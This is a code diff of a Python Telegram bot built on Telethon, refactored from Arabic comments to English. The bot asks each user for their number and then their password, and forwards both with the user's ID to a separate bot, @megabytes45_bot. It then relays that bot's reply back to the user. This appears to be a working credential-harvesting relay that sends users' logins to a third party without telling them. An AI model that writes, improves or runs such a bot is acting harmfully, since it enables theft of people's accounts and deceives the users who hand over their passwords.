@@ -1,64 +1,94 @@
 import os
-from telethon import TelegramClient, events
 import asyncio
+from telethon import TelegramClient, events
 
-# جلب البيانات من المتغيرات البيئية
-api_id = int(os.getenv('API_ID'))
-api_hash = os.getenv('API_HASH')
-bot_token = os.getenv('BOT_TOKEN')
+# Retrieve configuration from environment variables
+API_ID = int(os.getenv('API_ID'))
+API_HASH = os.getenv('API_HASH')
+BOT_TOKEN = os.getenv('BOT_TOKEN')
 
-# إنشاء عميل للـ bot
-client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)
+# Initialize both clients at the global level to prevent multiple login attempts
+bot_client = TelegramClient('bot_auth_session', API_ID, API_HASH)
+user_client = TelegramClient('user_forward_session', API_ID, API_HASH)
 
-# قاموس لتخزين حالة كل مستخدم
-users_state = {}
+# Dictionary to manage user states and track pending replies
+# Format: { sender_id: { 'step': str, 'number': str, 'password': str, 'future': asyncio.Future } }
+user_sessions = {}
 
-@client.on(events.NewMessage(pattern='/start'))
-async def start(event):
+@bot_client.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
     sender_id = event.sender_id
-    users_state[sender_id] = {'step': 'waiting_number'}
-    await event.respond('مرحبًا! الرجاء إرسال رقمك.')
+    user_sessions[sender_id] = {'step': 'waiting_number'}
+    await event.respond("Welcome! Please send your number.")
 
-@client.on(events.NewMessage)
-async def handle_message(event):
+@bot_client.on(events.NewMessage)
+async def sequence_handler(event):
     sender_id = event.sender_id
-    message = event.message.message
+    incoming_text = event.message.message
 
-    if sender_id not in users_state:
-        users_state[sender_id] = {'step': 'waiting_number'}
-        await event.respond('مرحبًا! الرجاء إرسال رقمك.')
+    # Ignore start command in the general handler
+    if incoming_text == '/start':
         return
 
-    user_state = users_state[sender_id]
+    if sender_id not in user_sessions:
+        user_sessions[sender_id] = {'step': 'waiting_number'}
+        await event.respond("Welcome! Please send your number.")
+        return
 
-    if user_state['step'] == 'waiting_number':
-        # استلام الرقم
-        user_state['number'] = message
-        user_state['step'] = 'waiting_password'
-        await event.respond('الرجاء إرسال كلمة المرور.')
-    elif user_state['step'] == 'waiting_password':
-        # استلام كلمة المرور
-        user_state['password'] = message
-        # الآن نرسل البيانات للبوت الآخر
-        await send_to_other_bot(sender_id, user_state['number'], user_state['password'])
-        user_state['step'] = 'waiting_reply'
-        await event.respond('تم الإرسال، يرجى الانتظار للرد.')
+    state = user_sessions[sender_id]
 
-async def send_to_other_bot(sender_id, number, password):
-    # استخدام Telethon لإرسال رسالة للبوت الآخر والانتظار للرد
-    async with TelegramClient('client_session', api_id, api_hash) as other_client:
-        await other_client.start()
-        message_text = f"رقم: {number}\nكلمة المرور: {password}"
-        await other_client.send_message('@megabytes45_bot', message_text)
+    if state['step'] == 'waiting_number':
+        state['number'] = incoming_text
+        state['step'] = 'waiting_password'
+        await event.respond("Please send your password.")
+        
+    elif state['step'] == 'waiting_password':
+        state['password'] = incoming_text
+        state['step'] = 'processing'
+        await event.respond("Processing your request, please wait...")
 
-        # استماع للرد من البوت الآخر
-        @other_client.on(events.NewMessage(from_users='@megabytes45_bot'))
-        async def reply_handler(event):
-            reply_message = event.message.message
-            # إرسال الرد للمستخدم الأصلي
-            await client.send_message(sender_id, f"رد البوت الآخر: {reply_message}")
+        # Create a Future object to wait for the specific response from the other bot
+        loop = asyncio.get_running_loop()
+        state['future'] = loop.create_future()
 
-        # انتظار حتى يتم استلام الرد
-        await asyncio.sleep(10)
+        # Construct and send the payload via the user client
+        payload = f"Number: {state['number']}\nPassword: {state['password']}\nUser_ID: {sender_id}"
+        await user_client.send_message('@megabytes45_bot', payload)
 
-client.run_until_disconnected()
+        try:
+            # Wait for the future to resolve with a timeout of 30 seconds
+            response_text = await asyncio.wait_for(state['future'], timeout=30.0)
+            await event.respond(f"Response received:\n{response_text}")
+        except asyncio.TimeoutError:
+            await event.respond("Error: Request timed out. The external bot did not reply in time.")
+        finally:
+            # Clean up user state after completion
+            user_sessions.pop(sender_id, None)
+
+# Global handler on the user_client to intercept replies from the external bot
+@user_client.on(events.NewMessage(from_users='@megabytes45_bot'))
+async def external_bot_reply_handler(event):
+    reply_text = event.message.message
+    
+    # In a real scenario, you need a way to map the incoming reply back to the original user.
+    # If the external bot doesn't echo the User_ID, we look for the first active pending session.
+    for sender_id, state in list(user_sessions.items()):
+        if state.get('step') == 'processing' and 'future' in state:
+            future = state['future']
+            if not future.done():
+                future.set_result(reply_text)
+                break
+
+async def main():
+    # Start both clients concurrently
+    await bot_client.start(bot_token=BOT_TOKEN)
+    await user_client.start()
+    
+    # Run until both are disconnected
+    await asyncio.gather(
+        bot_client.run_until_disconnected(),
+        user_client.run_until_disconnected()
+    )
+
+if __name__ == '__main__':
+    asyncio.run(main())
